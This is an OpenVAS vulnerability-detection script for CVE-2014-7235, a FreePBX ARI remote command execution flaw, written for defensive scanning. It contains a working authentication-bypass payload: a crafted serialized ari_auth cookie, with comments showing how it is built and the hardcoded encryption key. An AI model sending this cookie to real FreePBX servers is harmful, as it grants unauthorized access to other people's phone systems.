###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freepbx_ari_auth_70188.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# FreePBX 'index.php' Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:freepbx:freepbx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105195");
  script_bugtraq_id(70188);
  script_cve_id("CVE-2014-7235");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");

  script_name("FreePBX 'index.php' Remote Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70188");
  script_xref(name:"URL", value:"http://www.freepbx.org/");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary commands in
the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request with a special crafted cookie and check the response.");

  script_tag(name:"insight", value:"htdocs_ari/includes/login.php in the ARI Framework module/Asterisk Recording Interface (ARI) allows remote
attackers to execute arbitrary code via the ari_auth coockie, related to the PHP unserialize function, as exploited in the wild in September 2014.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"FreePBX is prone to a remote command-execution vulnerability because
the application fails to sufficiently sanitize input data.");

  script_tag(name:"affected", value:"FreePBX before 2.9.0.9, 2.10.x, and 2.11 before 2.11.1.5");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-02-06 16:04:47 +0100 (Fri, 06 Feb 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_freepbx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("freepbx/installed");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

# https://github.com/FreePBX/fw_ari/commit/f294b4580ce725ca3c5e692d86e63d40cef4d836
# https://github.com/FreePBX/cdr/blob/master/crypt.php
# http://code.freepbx.org/rdiff/FreePBX_SVN/freepbx/branches/2.3/amp_conf/htdocs/recordings/includes/main.conf.php?r1=4328&r2=6732&u&N
#
# $auth = 'a:2:{s:8:"username";b:1;s:8:"password";b:1;}';
# $auth = encrypt($auth, 'z1Mc6KRxA7Nw90dGjY5qLXhtrPgJOfeCaUmHvQT3yW8nDsI2VkEpiS4blFoBuZ');
# $md5 = md5($auth);
# urlencode('a:2:{i:0;s:88:"' . $auth  . '";i:1;s:32:"' . $md5  . '";}');

cookie = 'ari_auth=a%3A2%3A%7Bi%3A0%3Bs%3A88%3A%22rT9bcNlEJv%2F1G9j9ZcqPUej1ntSHDwlDvrv1pphLMel2lppX43' +
         'z4E%2BF2Yc3In070LIWRFCh1wanriTUnYC8%2F%2Bg%3D%3D%22%3Bi%3A1%3Bs%3A32%3A%224ffe329af509978387' +
         'ac4af2fbb3a694%22%3B%7D';

host = http_host_name(port:port);
useragent = http_get_user_agent();

req = 'GET ' + dir + '/recordings/index.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Connection: Close\r\n' +
      'Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1\r\n' +
      'Cookie:' + cookie + '\r\n' +
      'Accept-Language: en\r\n' +
      '\r\n';

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( ">Logout<" >< result && ">Call Monitor<" >< result && ">Voicemail<" >< result )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
